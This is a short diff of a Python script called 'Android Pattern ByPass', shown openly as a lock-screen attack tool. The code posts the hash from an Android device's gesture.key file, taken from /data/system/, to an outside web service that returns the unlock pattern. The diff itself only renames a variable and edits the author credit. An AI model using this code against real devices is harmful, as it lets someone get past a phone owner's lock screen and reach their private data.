@@ -4,18 +4,18 @@ from sys import argv
 
 #P-Decode 
 #Android Pattern ByPass ()
-#Coded by dogo h@ck
+#Coded by dogo h@ck (MGF15)
 #first you need gesture.key file you can find it on /data/system/
 
 def get(x):
 	try:
 		site = "http://android.saz.lt/cgi-bin/pattern.py"
 
-		pa = urllib.urlencode({'encoded':x})
+		P = urllib.urlencode({'encoded':x})
 
 		req  = urllib2.Request(site)
 
-		b   = urllib2.urlopen(req, pa)
+		b = urllib2.urlopen(req, P)
 
 		data = b.read()
 
